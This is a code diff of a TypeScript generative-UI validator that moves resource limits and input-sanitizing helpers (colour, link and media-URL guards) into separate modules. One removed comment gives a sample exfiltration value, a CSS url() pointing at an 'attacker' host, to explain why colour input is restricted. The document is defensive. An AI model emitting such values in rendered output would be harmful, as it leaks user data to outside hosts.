@@ -27,71 +27,11 @@ import {
   TEXT_SIZES, diagnoseUnknownGenuiFields, normalizeGenuiSpec,
 } from './component-schema.ts'
 import type { ComponentFieldKind, ComponentRecordSchema, ComponentSchema, GenuiDiagnostic } from './component-schema.ts'
+import { GENUI_LIMITS } from './genui-runtime/limits.ts'
+import { color, enu, int, num, obj, opt, safeHref, safeMediaSrc, str } from './genui-runtime/value-utils.ts'
 
 export { COMPONENT_SCHEMAS, GENUI_NATIVE_TYPES, diagnoseUnknownGenuiFields, normalizeGenuiSpec } from './component-schema.ts'
 export type { ComponentFieldKind, ComponentSchema, GenuiDiagnostic } from './component-schema.ts'
-
-/** Hard resource limits enforced by repair (and mirrored at render time). */
-export const GENUI_LIMITS = {
-  /** Maximum nesting depth of the component tree. */
-  maxDepth: 8,
-  /** Maximum total nodes across the whole spec. */
-  maxNodes: 200,
-  /** Maximum length of any plain string field. */
-  maxString: 2000,
-  /** Maximum length of a `code` body. */
-  maxCode: 12_000,
-  /** Maximum length of a mermaid source. */
-  maxMermaid: 8000,
-  /** Maximum `grid` columns. */
-  maxGridCols: 12,
-  /** Maximum `tabs` count. */
-  maxTabs: 12,
-  /** Maximum `accordion` items. */
-  maxAccordionItems: 24,
-  /** Maximum `list` items. */
-  maxListItems: 50,
-  /** Maximum `select`/`radio` options. */
-  maxOptions: 50,
-  /** Maximum `table` rows / columns. */
-  maxTableRows: 50,
-  maxTableCols: 12,
-  /** Maximum `chart` data points per series. */
-  maxChartPoints: 60,
-  /** Maximum `plot` series and per-series parameters. */
-  maxPlotSeries: 8,
-  maxPlotParams: 6,
-  /** Maximum `scene3d` meshes. */
-  maxMeshes: 5,
-  /** Maximum `quiz` options. */
-  maxQuizOptions: 8,
-  /** Maximum `steps` / `timeline` / `breadcrumb` / `keyvalue` entries. */
-  maxSteps: 24,
-  maxTimelineItems: 24,
-  maxBreadcrumbItems: 12,
-  maxKeyValuePairs: 24,
-  /** Maximum `file-tree` nesting. */
-  maxTreeDepth: 6,
-  /** Maximum `diagram` nodes / edges / zones / focal accents (editorial
-   * complexity budget, mirroring diagram-design's §7 limits). */
-  maxDiagramNodes: 9,
-  maxDiagramEdges: 12,
-  maxDiagramZones: 3,
-  maxDiagramFocal: 2,
-  maxDiagramLabel: 14,
-
-  /** Maximum depth of an `echart` option object (prevents pathological nested
-   * ECharts configs from stalling the guard walk). */
-  maxEChartOptionDepth: 10,
-  /** Maximum length of any single array inside an `echart` option (prevents
-   * a model from stalling rendering with `series.data` of hundreds of
-   * thousands of points). */
-  maxEChartArrayLen: 500,
-  /** Maximum total entries (object keys + array elements) traversed while
-   * sanitizing an `echart` option. Bounds the walk so a pathologically
-   * large option object cannot stall the guard. */
-  maxEChartOptionNodes: 2000,
-} as const
 
 /** Result of `validateGenuiSpec`. */
 export interface GenuiValidation {
@@ -100,77 +40,7 @@ export interface GenuiValidation {
   errors: string[]
 }
 
-/* ---------------- shared field helpers ---------------- */
-
-/** Is `v` one of `values`? (enum guard) */
-function inEnum<T extends string>(v: unknown, values: readonly T[]): v is T {
-  return typeof v === 'string' && (values as readonly string[]).includes(v)
-}
-
-/** String field: truncate a string to `cap`, or undefined when not a string. */
-function str(v: unknown, cap: number): string | undefined {
-  return typeof v === 'string' ? v.slice(0, cap) : undefined
-}
-
-/**
- * Color field: the value lands in an inline `style` (background/stroke) or
- * THREE.Color. Arbitrary CSS values are an exfiltration channel — a model
- * (or a hostile spec) could emit `url(https://attacker/track?...)` and the
- * browser would fetch it. Only formats that name a color pass: hex, rgb/hsl
- * functions, and host design tokens (`var(--dsw-*)`). Anything else degrades
- * to the component's default palette.
- */
-const SAFE_COLOR_RE = /^(?:#[\da-fA-F]{3,8}|rgba?\([^)]{0,64}\)|hsla?\([^)]{0,64}\)|var\(--dsw-[\w-]+(?:,\s*#[0-9a-fA-F]{3,8})?\))$/
-
-function color(v: unknown): string | undefined {
-  if (typeof v !== 'string') return undefined
-  const s = v.trim()
-  return s.length <= 64 && SAFE_COLOR_RE.test(s) ? s : undefined
-}
-
-/**
- * Link target field: only http(s) and mailto survive. `javascript:`/`data:`
- * and every other scheme degrade to a plain-text node — the model's link is
- * display, not an execution channel.
- */
-function safeHref(v: unknown): string | undefined {
-  if (typeof v !== 'string') return undefined
-  const s = v.trim()
-  if (s.length > 2048) return undefined
-  return /^https?:\/\//i.test(s) || /^mailto:[^@\s]+@[^@\s]+$/i.test(s) ? s : undefined
-}
-
-/** Media loads bytes, so accept only browser-reachable http(s) or same-origin
- * relative paths. Active/local schemes and protocol-relative URLs are
- * rejected. The renderer always keeps playback user-controlled. */
-function safeMediaSrc(v: unknown): string | undefined {
-  if (typeof v !== 'string') return undefined
-  const s = v.trim()
-  if (s === '' || s.length > 2048) return undefined
-  if (/^https?:\/\//i.test(s)) return s
-  if (/^[a-z][a-z0-9+.-]*:/i.test(s) || /^[/\\]{2}/.test(s)) return undefined
-  return s
-}
-
-/** Finite-number field: clamp into [min, max], or undefined when not finite. */
-function num(v: unknown, min: number, max: number): number | undefined {
-  return typeof v === 'number' && Number.isFinite(v) ? Math.min(max, Math.max(min, v)) : undefined
-}
-
-/** Integer field: clamp into [min, max], or undefined when not a finite integer. */
-function int(v: unknown, min: number, max: number): number | undefined {
-  return typeof v === 'number' && Number.isFinite(v) ? Math.min(max, Math.max(min, Math.trunc(v))) : undefined
-}
-
-/** Optional enum field: the value when it matches, otherwise undefined. */
-function enu<T extends string>(v: unknown, values: readonly T[]): T | undefined {
-  return inEnum(v, values) ? v : undefined
-}
-
-/** Plain object (not array, not null). */
-function obj(v: unknown): Record<string, unknown> | undefined {
-  return typeof v === 'object' && v !== null && !Array.isArray(v) ? v as Record<string, unknown> : undefined
-}
+/* ---------------- schema field helpers ---------------- */
 
 function fieldKindMatches(value: unknown, kind: ComponentFieldKind): boolean {
   switch (kind) {
@@ -317,16 +187,6 @@ function validateRegistryFields(
     }
   }
   validateNestedRecordSchemas(value, at, definition, errors)
-}
-
-/**
- * Optional-field spread helper. `exactOptionalPropertyTypes` forbids
- * `{ gap: number | undefined }`; computing the value into a const first and
- * spreading `opt('gap', g)` keeps every optional field either absent or a
- * plain value.
- */
-function opt<K extends string, V>(key: K, value: V | undefined): Partial<Record<K, V>> {
-  return value === undefined ? {} : { [key]: value } as Partial<Record<K, V>>
 }
 
 /* ---------------- repair ---------------- */
